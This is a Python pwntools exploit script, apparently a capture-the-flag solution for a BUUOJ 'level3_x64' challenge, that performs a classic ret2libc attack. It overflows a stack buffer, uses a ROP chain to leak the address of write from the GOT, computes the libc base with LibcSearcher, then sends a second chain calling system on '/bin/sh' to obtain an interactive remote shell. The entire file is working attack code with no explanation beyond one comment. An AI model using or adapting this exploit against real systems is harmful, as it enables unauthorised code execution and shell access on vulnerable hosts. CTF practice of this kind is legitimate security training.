from pwn import *
from LibcSearcher import *

context(os = "linux", arch = "amd64")
context.log_level = "debug"

#就常规的ret2libc吧

offset  = 0x80
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1
e = ELF('./level3_x64')

p = remote('node4.buuoj.cn', 28383)

pld1 = b'a'*(offset + 8)
pld1 += p64(pop_rdi_ret)
pld1 += p64(1)
pld1 += p64(pop_rsi_r15_ret)
pld1 += p64(e.got['write'])
pld1 += p64(0)
pld1 += p64(e.plt['write'])
pld1 += p64(e.sym['vulnerable_function'])

p.sendlineafter(b'Input:\n', pld1)

write_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

pld2 = b'a'*(offset+8)
pld2 += p64(pop_rdi_ret)
pld2 += p64(binsh_addr)
pld2 += p64(system_addr)
p.sendlineafter(b'Input:\n', pld2)

p.interactive()
